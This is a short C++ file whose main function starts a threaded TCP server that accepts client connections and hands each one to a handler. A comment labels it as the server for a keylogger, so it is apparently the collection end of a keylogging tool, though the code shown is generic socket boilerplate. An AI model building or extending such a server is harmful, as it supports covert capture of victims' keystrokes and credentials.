#include "sockets.h"
#include "clients.h"
#include <pthread.h> 
#include <sys/types.h>

using namespace std; 

#define DEFAULT_BUFLEN 512

int main(){
   
    /**
    accept_clients();		//Recive connections
	send_clients();		//Send data to clients
	recv_clients();	
    */

    pthread_t clientThread; 
    client_t clientSocket;   

    int ClientSocket = -1;

    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    
    // for the keylogger server
    struct addrinfo testing = GetSocketAddress(SERVER_IP, DEFAULT_PORT); 
    int myconnection = createAndBind(&testing); 
    listenSocket(&myconnection);


    while(true){       
       if(acceptClient(myconnection, &clientSocket)){    
           client_t *clientP = (struct client_t*) malloc(sizeof(struct client_t));
           *clientP = clientSocket; 
           pthread_create(&clientThread, NULL, handleClientConnection, clientP); 
           //handleClientConnection(clientSocket); 
       }
    }

    return 0; 
}

